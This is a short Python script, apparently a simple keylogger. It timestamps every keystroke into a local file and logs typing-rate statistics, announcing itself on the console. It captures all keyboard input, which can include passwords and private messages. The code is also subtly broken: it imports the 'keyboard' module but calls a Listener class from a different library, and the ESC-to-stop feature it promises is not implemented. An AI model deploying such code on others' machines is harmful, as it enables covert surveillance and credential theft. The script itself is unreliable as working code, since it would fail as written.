import keyboard
import time
from datetime import datetime
import os
import threading
#
class KeyLogger:
    def __init__(self, log_interval=60):
        self.count = 0
        self.log_interval = log_interval  # seconds
        self.log_file = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.running = True
        self.logger_thread = None
        
    def on_press(self, key):
        self.count += 1
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] Key pressed: {key}\n"
        
        with open(self.log_file, "a") as f:
            f.write(log_entry)
        
        print(f"Total keys pressed: {self.count}", end="\r")
    
    def periodic_log(self):
        """Periodically write statistics to log"""
        while self.running:
            time.sleep(self.log_interval)
            stats = f"[STATS] Keys per second: {self.count/self.log_interval}\n"
            with open(self.log_file, "a") as f:
                f.write(stats)
            self.count = 0
    
    def start(self):
        print(f"Keylogger started... Logging to {self.log_file}")
        print("Press ESC to stop.")
        

        self.logger_thread = threading.Thread(target=self.periodic_log)
        self.logger_thread.daemon = True
        self.logger_thread.start()
        

        with keyboard.Listener(on_press=self.on_press) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                pass
    
    def stop(self):
        self.running = False
        if self.logger_thread:
            self.logger_thread.join(timeout=1)
        print("\nKeylogger stopped.")

if __name__ == "__main__":
    logger = KeyLogger()
    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
